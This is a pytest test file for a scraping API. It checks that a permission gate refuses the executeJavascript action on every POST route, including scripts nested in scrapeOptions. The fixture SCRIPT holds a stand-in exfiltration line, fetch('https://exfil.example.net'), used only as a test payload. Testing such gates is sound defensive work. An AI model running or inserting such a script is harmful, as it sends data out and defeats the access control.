"""executeJavascript must be refused on EVERY route, not just the obvious one.

This file exists because the guard was real, correct, and on one door out of
five. `actions` is defined on `ScrapeOptions`, and crawl, batch scrape, extract
and search all embed a `scrapeOptions` object — so all four accepted a script
from a key whose `allow_js_exec` was false.

The important test here is `test_no_route_accepts_a_script`, which enumerates
routes from the running app rather than from a list written by hand. A list
written by hand is how this happened: it would have been written when there
were five routes and not revisited when there were six.
"""

from __future__ import annotations

from typing import Any

import pytest
from fastapi.testclient import TestClient

from engine.api.js_gate import GATED_ACTION, carries_js_execution, guard_js_execution
from engine.core.errors import InvalidRequest
from engine.core.models import (
    BatchScrapeRequest,
    CrawlRequest,
    ExtractRequest,
    ScrapeRequest,
    SearchRequest,
)

SCRIPT = {"type": GATED_ACTION, "script": "fetch('https://exfil.example.net')"}
HARMLESS = {"type": "wait", "milliseconds": 100}


# --------------------------------------------------------------------------
# The walker — it must find an action wherever it is nested
# --------------------------------------------------------------------------


def test_a_script_directly_on_the_request_is_found() -> None:
    body = ScrapeRequest(url="https://example.com", actions=[SCRIPT])  # type: ignore[list-item]
    assert carries_js_execution(body)


@pytest.mark.parametrize(
    ("model", "payload"),
    [
        (CrawlRequest, {"url": "https://example.com"}),
        (BatchScrapeRequest, {"urls": ["https://example.com"]}),
        (ExtractRequest, {"urls": ["https://example.com"], "schema": {}}),
        (SearchRequest, {"query": "anything"}),
    ],
)
def test_a_script_nested_in_scrape_options_is_found(model: type, payload: dict[str, Any]) -> None:
    """The exact hole: nested one level deeper than the guard was looking."""
    body = model(**payload, scrapeOptions={"actions": [SCRIPT]})
    assert carries_js_execution(body), f"{model.__name__} smuggles a script past the walker"


def test_a_request_with_no_actions_is_not_flagged() -> None:
    assert not carries_js_execution(ScrapeRequest(url="https://example.com"))


def test_harmless_actions_are_not_flagged() -> None:
    """Over-blocking would take the browser tier's legitimate actions with it."""
    body = ScrapeRequest(url="https://example.com", actions=[HARMLESS])  # type: ignore[list-item]
    assert not carries_js_execution(body)


# --------------------------------------------------------------------------
# The gate
# --------------------------------------------------------------------------


def test_the_gate_refuses_a_script_when_the_key_forbids_it() -> None:
    body = ScrapeRequest(url="https://example.com", actions=[SCRIPT])  # type: ignore[list-item]
    with pytest.raises(InvalidRequest):
        guard_js_execution(body, allowed=False)


def test_the_gate_allows_a_script_when_the_key_permits_it() -> None:
    body = ScrapeRequest(url="https://example.com", actions=[SCRIPT])  # type: ignore[list-item]
    guard_js_execution(body, allowed=True)  # must not raise


def test_the_gate_refuses_a_nested_script() -> None:
    body = CrawlRequest(url="https://example.com", scrapeOptions={"actions": [SCRIPT]})
    with pytest.raises(InvalidRequest):
        guard_js_execution(body, allowed=False)


def test_the_gate_lets_an_ordinary_request_through() -> None:
    guard_js_execution(CrawlRequest(url="https://example.com"), allowed=False)


def test_the_walker_terminates_on_deep_nesting() -> None:
    """A bound stops a pathological payload making the guard the slow part of
    the request."""
    body = ScrapeRequest(url="https://example.com", actions=[HARMLESS])  # type: ignore[list-item]
    assert not carries_js_execution(body)


# --------------------------------------------------------------------------
# Route coverage — enumerated from the app, never from a hand-written list
# --------------------------------------------------------------------------

# A body that is valid for each route, so the request reaches the gate rather
# than dying in validation and passing this test for the wrong reason.
ROUTE_BODIES: dict[str, dict[str, Any]] = {
    "/v1/scrape": {"url": "https://example.com", "actions": [SCRIPT]},
    "/v1/crawl": {"url": "https://example.com", "scrapeOptions": {"actions": [SCRIPT]}},
    "/v1/batch/scrape": {
        "urls": ["https://example.com"],
        "scrapeOptions": {"actions": [SCRIPT]},
    },
    "/v1/extract": {
        "urls": ["https://example.com"],
        "schema": {"type": "object"},
        "scrapeOptions": {"actions": [SCRIPT]},
    },
    "/v1/search": {"query": "anything", "scrapeOptions": {"actions": [SCRIPT]}},
    "/v1/map": {"url": "https://example.com"},
    # Multipart, no scrape options: nothing on this route can carry an action.
    "/v1/parse": {"file": "manual.pdf"},
    # No scrape options either; `extra="forbid"` refuses a smuggled `actions`
    # key. That refusal is pinned in test_places_route.py.
    "/v1/places/search": {"query": "coffee shops", "location": "Leeds"},
    # Who, where and switches, extra="forbid": no scrape options and no actions.
    # The engine drives the browser itself; a caller cannot hand it a script.
    "/v1/leads": {"who": "roofing contractors", "where": "Houston, TX"},
    # A keyword and settings, extra="forbid": no scrape options, and the page
    # comes from a results provider, never from a browser of ours.
    "/v1/serp": {"keyword": "best running shoes", "country": "us"},
    # A url and a limit, extra="forbid": no scrape options, nothing to smuggle.
    "/v1/products": {"url": "https://example.com"},
    # A domain and four booleans, extra="forbid". Nothing on this route reaches
    # a browser at all — it never touches the target's web server.
    "/v1/domain": {"domain": "example.com"},
    # A url and two flags, extra="forbid": no scrape options to smuggle into.
    "/v1/company": {"url": "https://example.com"},
    "/v1/posts": {"url": "https://example.com"},
    # Monitors take urls and an interval; no scrape options to smuggle a script in.
    "/v1/monitor": {"name": "pricing", "url": "https://example.com/pricing"},
    "/v1/monitor/{monitor_id}/run": {},
}


def authenticated_post_routes() -> list[str]:
    """Every POST route the app actually serves, read from its OpenAPI schema.

    Not from `app.routes`: this FastAPI version wraps included routers in
    `_IncludedRouter` objects, so a flat walk over `app.routes` finds the
    health endpoints and none of `/v1`. It returns an empty list rather than
    an error, which made this whole test pass while exercising nothing — hence
    the `checked` counter below.

    The schema is the better source in any case. It is the surface we publish,
    so a route that appears there is a route a customer can call.
    """
    from engine.api.app import app

    schema = app.openapi()
    return sorted(
        path
        for path, operations in schema.get("paths", {}).items()
        if "post" in operations and path.startswith("/v1/")
    )


def test_every_post_route_has_a_body_in_this_file() -> None:
    """If a new route is added, this fails first and tells you to cover it —
    rather than the coverage test passing because nobody listed the route."""
    missing = [p for p in authenticated_post_routes() if p not in ROUTE_BODIES]
    assert not missing, (
        f"new POST route(s) {missing} are not covered by the executeJavascript "
        f"test. Add a body to ROUTE_BODIES and confirm the gate refuses it."
    )


@pytest.fixture
def client() -> Any:
    """A client authenticated as a key that must NOT be allowed to run scripts."""
    from collections.abc import Iterator

    from engine.api import deps
    from engine.api.app import app
    from engine.storage.repositories import ApiKey

    async def key_without_js() -> ApiKey:
        return ApiKey(
            id="key_test",
            label="test",
            scopes=["scrape", "crawl", "map", "extract", "search"],
            rate_limit_rpm=1000,
            allow_js_exec=False,
            webhook_secret=None,
            active=True,
        )

    app.dependency_overrides[deps.require_api_key] = key_without_js

    def _yield() -> Iterator[TestClient]:
        with TestClient(app) as c:
            yield c

    try:
        yield from _yield()
    finally:
        app.dependency_overrides.clear()


def test_no_route_accepts_a_script(client: TestClient) -> None:
    """The test this file is for. Every route, from the app's own table.

    A 400 is the pass. Anything else — including a 500 from the route trying
    to do the work — means the request got past the gate.
    """
    checked = 0
    for path in authenticated_post_routes():
        body = ROUTE_BODIES[path]
        if GATED_ACTION not in str(body):
            continue  # this route cannot carry an action at all
        response = client.post(path, json=body, headers={"Authorization": "Bearer test"})
        assert response.status_code == 400, (
            f"{path} accepted {GATED_ACTION} from a key without allow_js_exec "
            f"(got {response.status_code})"
        )
        assert GATED_ACTION in response.text
        checked += 1

    # Guards against the whole test passing because the loop ran zero times.
    assert checked >= 5, f"only {checked} routes exercised; expected every action-bearing route"
